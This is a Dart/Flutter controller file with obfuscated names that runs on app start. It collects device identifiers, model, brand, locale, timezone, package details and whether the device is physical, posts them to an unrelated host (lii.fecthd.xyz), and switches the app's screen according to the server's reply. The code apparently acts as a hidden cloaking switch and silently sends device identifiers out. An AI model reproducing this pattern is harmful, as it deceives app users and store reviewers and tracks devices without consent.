import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var nxbauzkd = RxBool(false);
  var woalnptvsf = RxBool(true);
  var dhaveyxc = RxString("");
  var lily = RxBool(false);
  var eichmann = RxBool(true);
  final gjesqd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bifhul();
  }


  Future<void> bifhul() async {

    lily.value = true;
    eichmann.value = true;
    woalnptvsf.value = false;

    gjesqd.post("https://lii.fecthd.xyz/mkpwtvhyuilogjracfbe",data: await vhxkzady()).then((value) {
      var caupbf = value.data["caupbf"] as String;
      var keoqycnl = value.data["keoqycnl"] as bool;
      if (keoqycnl) {
        dhaveyxc.value = caupbf;
        nedra();
      } else {
        bergstrom();
      }
    }).catchError((e) {
      woalnptvsf.value = true;
      eichmann.value = true;
      lily.value = false;
    });
  }

  Future<Map<String, dynamic>> vhxkzady() async {
    final DeviceInfoPlugin vsfrbuw = DeviceInfoPlugin();
    PackageInfo jbxetd_kdohwv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var efkjq = Platform.localeName;
    var sn_uBWdCwj = currentTimeZone;

    var sn_FRNUP = jbxetd_kdohwv.packageName;
    var sn_tpbc = jbxetd_kdohwv.version;
    var sn_suNvo = jbxetd_kdohwv.buildNumber;

    var sn_pLledOY = jbxetd_kdohwv.appName;
    var sn_suMIQAZ = "";
    var daytonSchaden = "";
    var kobyCollins = "";
    var sn_fZ = "";
    var juanitaHyatt = "";
    var abrahamJacobi = "";
    var shaniaHessel = "";
    var nicoWilkinson = "";
    var sn_WSPjl  = "";
    var cedrickSchoen = "";

    var corbinCummings = "";

    var sn_XW = "";
    var sn_uSG = false;

    if (GetPlatform.isAndroid) {
      sn_XW = "android";
      var sbxhoam = await vsfrbuw.androidInfo;

      sn_fZ = sbxhoam.brand;

      sn_suMIQAZ  = sbxhoam.model;
      sn_WSPjl = sbxhoam.id;

      sn_uSG = sbxhoam.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sn_XW = "ios";
      var zkrnapubd = await vsfrbuw.iosInfo;
      sn_fZ = zkrnapubd.name;
      sn_suMIQAZ = zkrnapubd.model;

      sn_WSPjl = zkrnapubd.identifierForVendor ?? "";
      sn_uSG  = zkrnapubd.isPhysicalDevice;
    }
    var res = {
      "sn_suMIQAZ": sn_suMIQAZ,
      "sn_suNvo": sn_suNvo,
      "sn_tpbc": sn_tpbc,
      "sn_FRNUP": sn_FRNUP,
      "shaniaHessel" : shaniaHessel,
      "sn_fZ": sn_fZ,
      "sn_WSPjl": sn_WSPjl,
      "corbinCummings" : corbinCummings,
      "efkjq": efkjq,
      "sn_pLledOY": sn_pLledOY,
      "nicoWilkinson" : nicoWilkinson,
      "sn_XW": sn_XW,
      "sn_uSG": sn_uSG,
      "juanitaHyatt" : juanitaHyatt,
      "abrahamJacobi" : abrahamJacobi,
      "sn_uBWdCwj": sn_uBWdCwj,
      "daytonSchaden" : daytonSchaden,
      "kobyCollins" : kobyCollins,
      "cedrickSchoen" : cedrickSchoen,

    };
    return res;
  }

  Future<void> bergstrom() async {
    Get.offAllNamed("/house_tab");
  }

  Future<void> nedra() async {
    Get.offAllNamed("/house_fact");
  }
}
